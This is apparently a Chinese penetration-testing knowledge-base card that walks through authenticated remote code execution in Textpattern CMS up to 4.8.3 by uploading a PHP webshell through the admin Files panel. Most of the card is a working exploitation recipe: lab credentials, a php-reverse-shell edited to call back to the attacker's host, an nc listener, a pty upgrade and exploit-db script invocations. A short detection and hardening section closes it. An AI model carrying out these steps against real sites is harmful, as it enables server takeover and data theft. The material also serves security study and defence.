---
id: web-php-rce-textpattern-files-unrestricted-php-upload-webshell
title: Textpattern 后台 Files 功能不校验扩展名：admin 会话上传 PHP 落 files/ 目录直接执行 getshell
type: scenario
domain: web
path: web/php/rce
technique: textpattern-admin-files-unrestricted-php-upload
tags:
- php
- textpattern
- cms
- backend
- file-upload
- webshell
- rce
- authenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
affected_versions: Textpattern <= 4.8.3
verification:
  verified_by: verifier-V696
  verified_at: '2026-11-13T18:18:17+08:00'
  notes: '已对照原文与全部43图核对：49620.py/48943.py 元信息与两者的失败输出（图24-27，File uploaded with id None + testing.php 404；var textpattern 解析 AttributeError）、Files 面板上传 shell11.php 成功（图28/33，ID4）、访问 /textpattern/files/shell11.php 反弹 www-data（图34）、pty 升级（图35）均一致；affected_versions 按 48943.py 原文标注 ''Software: Textpattern <= 4.8.3'' 设置；未验证点：未复跑 exploit 脚本与上传（靶场已下线）。'
url: /docs/web/php/rce/web-php-rce-textpattern-files-unrestricted-php-upload-webshell/
draft: false
kb_aliases:
- Textpattern 4.8.3 RCE
- Textpattern 后台 getshell
- txp Files 上传 php
- /textpattern/files/ webshell
- exploit-db 49620
- exploit-db 48943
- Textpattern Authenticated RCE
---

## 一句话结论

Textpattern CMS 后台的 Content → Files 功能把上传文件原样存到 Web 根下的 `/textpattern/files/` 且不校验扩展名，管理员会话（含通过备份包泄露口令直接登录的会话）上传 `.php` 后访问 `/textpattern/files/<name>.php` 即由 PHP 执行，构成认证后的任意文件上传 getshell。

## 原理

- Textpattern 的 Files 面板是给内容编辑者上传附件（图片、文档、媒体）的合法功能，上传记录写入数据库并落盘到站点目录下的 `files/`；本题路径为 `/textpattern/files/`。
- 该功能只按业务需要接受任意文件名与扩展名（后台列表里 `.sh`、`.php` 均显示为已上传文件），没有针对可执行脚本的扩展名黑/白名单；而 `files/` 位于 Web 根内、Apache 将 `.php` 交给 PHP 解析（本题 PHP 5.5.38 + Apache 2.2.22 Debian），于是“上传附件”直接等价于“向 Web 根写 PHP 文件”。
- 合法功能被滥用是关键：不需要上传漏洞绕过技巧，只要有 admin/编辑者会话即可；因此攻击链通常先通过弱口令、凭据泄露（如备份包 `creds.txt`）取得后台账号，再借 Files 上传完成 RCE。
- 公开 exploit 的存在说明这是已知问题：exploit-db 49620.py（Ricardo Ruiz，标题 `Textpattern 4.8.3 - Remote code execution (Authenticated)`，注释 `Version: Previous to 4.8.3`）与 48943.py（Michele '0blio' Cisternino，`Software: Textpattern <= 4.8.3`，`CVE-2020-XXXXX - Authenticated RCE via Unrestricted File Upload`）都走“登录 → 上传 PHP → 访问执行”。
- 但 exploit 脚本对目标版本/页面结构敏感：本题 49620.py 返回 `File uploaded with id None` 且访问 `/textpattern/textpattern/files/testing.php` 404（上传记录未真正落盘）；48943.py 在解析登录页 `var textpattern = ...` 时 `AttributeError: 'NoneType' object has no attribute 'replace'` 中断。手动复现同一后台功能即可成功——这是可复用的经验：脚本挂了不代表漏洞不成立，按功能点手工上传即可。
- 落盘位置与访问路径可从后台 Files 列表的 Download 链接或公开资料确认；本题上传 `shell11.php` 后访问 `/textpattern/files/shell11.php` 触发 php-reverse-shell 反弹。

## 触发条件

- 已取得 Textpattern 后台有效账号（弱口令、凭据泄露、口令复用等），能访问 `/textpattern/textpattern/` 并保持会话。
- 目标 Textpattern 版本允许 Files 面板上传任意扩展名（本题后台显示 4.8.3）。
- `files/` 目录位于 Web 根内且 Web 服务器对 `.php` 正常解析；`file_uploads` 开启、上传大小未拦截。
- 后台与 `files/` 对外可达。

## 利用步骤

1. 登录后台：访问 `/textpattern/textpattern/`，用泄露/破解得到的账号口令登录（本题 `mayer:lionheart`）。
2. 确认版本与入口：页面左下角显示 `Textpattern CMS (v4.8.3)`；进入 Content → Files（`/textpattern/textpattern/index.php?event=file`）。
3. 准备载荷：复制 `php-reverse-shell.php` 为 `shell11.php`，把 `$ip`/`$port` 改成攻击机地址与监听端口；或先用 `<?php phpinfo(); ?>` 验证执行。
4. 上传：在 Files 页面 Browse 选择 `shell11.php`，点 Upload，列表出现该文件（无报错、无扩展名拦截）。
5. 触发：攻击机 `nc -lvvp 5555`，访问 `http://target/textpattern/files/shell11.php`，获得 `www-data` 反弹 shell；升级交互 `python -c "import pty;pty.spawn('/bin/bash')"`。
6. 自动化尝试（可选）：先试 exploit-db 脚本，失败则回到手动上传。

## PoC

```bash
# 0) 攻击机监听
nc -lvvp 5555

# 1) 准备 PHP 载荷（php-reverse-shell 改 IP/端口）
cp /usr/share/webshells/php/php-reverse-shell.php ./shell11.php
vim shell11.php      # $ip='<attacker>'; $port=5555;

# 2) 后台登录（示例，表单字段以页面为准）
# POST /textpattern/textpattern/  Name=mayer&Password=lionheart

# 3) Files 面板上传 shell11.php
# GET  /textpattern/textpattern/index.php?event=file
# POST /textpattern/textpattern/index.php?event=file  (multipart, file=shell11.php)

# 4) 访问落盘文件触发执行
curl http://target/textpattern/files/shell11.php

# 可选自动化（版本/页面结构不符会失败，失败后改手动）
python /usr/share/exploitdb/exploits/php/webapps/49620.py \
  -t http://target/textpattern/textpattern -u mayer -p lionheart
python /usr/share/exploitdb/exploits/php/webapps/48943.py \
  http://target/textpattern mayer lionheart
```

```text
# 预期：nc 收到 www-data 的反弹 shell；访问 phpinfo 载荷则回显 PHP Version。
```

## 变体与关联

- 变体：先上传 `<?php phpinfo();?>` 到 `files/test.php` 验证“可上传+可执行”，再换正式 webshell，减少无效反弹。
- 变体：同属“admin 合法功能写 PHP”的 CMS：Joomla 模板编辑器（[[web-php-rce-joomla-admin-template-editor-webshell]]）、CmsEasy 模板保存（[[web-php-rce-cmseasy-cve-2021-42643-template-save-file-write]]）；通用上传绕过见 `web/generic/file-upload` 下的 admin 上传类型配置类卡片。
- 关联：前置凭据获取见 [[pentest-initial-access-web-backup-zip-weak-password-cms-credential]]；上传后提权见 [[pentest-privilege-escalation-dirtycow-cve-2016-5195-local-root]]。
- 边界：Files 面板禁用/只允许白名单、`files/` 目录被 Web 服务器配置为禁止 PHP 解析（如 `php_admin_flag engine off`）、后台账号无 Files 权限时，本场景不成立。

## 检测与防御

- 检测：`files/` 目录出现 `.php`/`.phtml` 等可执行文件；Web 日志中对 `/textpattern/files/*.php` 的 GET；后台 `event=file` 的 POST 上传后紧跟同目录脚本访问；文件完整性监控与 EICAR/webshell 特征扫描。
- 防御：Files 上传按扩展名白名单（图片/文档）并校验 MIME；`files/` 目录禁止脚本执行（Apache `<Directory>` 中 `php_admin_flag engine off` / Nginx 不转发给 PHP）；上传文件重命名并去可执行后缀。
- 加固：后台强口令与二次认证，避免凭据泄露直达后台；限制后台来源 IP；及时升级 Textpattern 并关注 Files 功能权限模型。
